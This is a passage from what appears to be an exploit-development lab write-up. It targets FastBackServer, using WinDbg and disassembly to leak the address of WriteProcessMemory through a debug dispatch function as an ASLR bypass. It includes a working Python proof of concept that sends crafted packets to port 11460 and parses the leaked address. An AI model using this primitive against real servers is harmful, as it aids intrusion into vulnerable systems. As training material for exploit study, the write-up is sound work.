i'll spare you the suspense. these values relate to an existing IP address and port. a TCP connection is created by calling [`connect`](https://learn.microsoft.com/en-gb/windows/win32/api/winsock2/nf-winsock2-connect).

```c
int WSAAPI connect(
SOCKET s,
const sockaddr *name,
int namelen
);
```

[`sockaddr`](https://learn.microsoft.com/en-gb/windows/win32/winsock/sockaddr-2) has the following structure.

```c
struct sockaddr_in {
    short sin_family;
    u_short sin_port;
    struct in_addr sin_addr;
    char sin_zero[8];
};
```

we can rephrase the debug output now.

```shell
0dbad948 00000000    ; Port location (empty)
0dbb9cdc 00000000    ; IP location (empty)

0dbad948 000020d0    ; Port value
0dbb9cdc 7877a8c0    ; IP
```

given that `in_addr` represents the IP address with each octet as a single byte, we can decipher the IP address.

```shell
0x7877a8c0 breaks down to:
c0 = 192
a8 = 168
77 = 119
78 = 120
```

you can also reverse the order of the `DWORD` and convert it to decimal to find the port number.

```shell
0:077> dd ebp-12550 L1
0dbad948 000020d0     ; Raw port value
0:077> ? d020
Evaluate expression: 53280 = 0000d020    ; Converted to decimal
```

to recap:

- we've resolved arbitrary function addresses via `SymGetSymFromName`.

- the address is formatted into a response buffer.

- the response was sent back over the existing network connection.

this provides a reliable ASLR bypass primitive! let's keep going.

you can verify the network connection by running `netstat -anbp tcp`.

```shell
# netstat output analysis
TCP 192.168.120.10:11406 0.0.0.0:0 LISTENING        # FastBackServer listening
TCP 192.168.120.10:11460 0.0.0.0:0 LISTENING        # Main service port
TCP 192.168.120.10:11460 192.168.119.120:53280 CLOSE_WAIT   # Our connection
```

so, there's a function that connects to the network. there must also be a function that sends data over the network. this next block focuses on the `FXCLI_IF_Buffer_Send` function.

```asm
00575D0F mov     edx, [ebp+var_12548]
00575D15 push    edx
00575D16 mov     eax, [ebp+var_C370]
00575D1C mov     ecx, [eax+8]
00575D1F push    ecx
00575D20 mov     edx, [ebp+var_C36C]
00575D26 push    edx
00575D27 mov     eax, _FXCLI_pcFileBuffer
00575D2C push    eax
00575D2D call    _FXCLI_IF_Buffer_Send    # Key sending function
00575D32 add     esp, 10h
00575D35 jmp     loc_575DD6
```

let's do some dynamic analysis on this function by single-stepping until the call to the function.

```shell
eip=00575d2d esp=0db5e324 ebp=0dbbfe98
0:077> da poi(esp)
00ede3a8 "XpressServer: SymbolOperation..."    # Header
00ede3c8 "------------------------------..."   # Separator
00ede3e8 "Value of [WriteProcessMemory] is"    # Target function
00ede408 ": ..Address is: 0x75342890 .Flag"    # Resolved address
00ede428 "s are: 0x207 .Size is : 0x20 ."     # Additional info
```

the string with the address of `WriteProcessMemory` is supplied as an argument to `FXCLI_IF_Buffer_Send`.

we can modify the PoC even more so it receives data after sending a request packet.

```python
def main():
    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)
    
    server = sys.argv[1]
    port = 11460
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    response = s.recv(1024)    # Added response handling
    print(response)
    s.close()
```

```bash
kali@kali:~$ python3 poc.py 192.168.120.10
b'\x00\x00\x00\x9eXpressServer: SymbolOperation \n-------------------------------
\nValue of [WriteProcessMemory] is: \n\nAddress i s : 0x75342890 \nFlags are: 0x207
\nSize is : 0x20 \n'
[+] Packet sent
```

we can now receive the output from `FXCLI_DebugDispatch`, which includes the address of `WriteProcessMemory`. ;)

we can refine the PoC even further, by filtering the data so it only prints the address.

```python
def parseResponse(response):
    """Parse a server response and extract the leaked address"""
    pattern = b"Address is:"
    address = None
    
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    
    if not address:
        print("[-] Could not find the address in the Response")
        sys.exit()
    
    return address
```

```shell
$ python3 poc.py 192.168.120.10
0x75342890
[+] Packet sent
```

perfect!







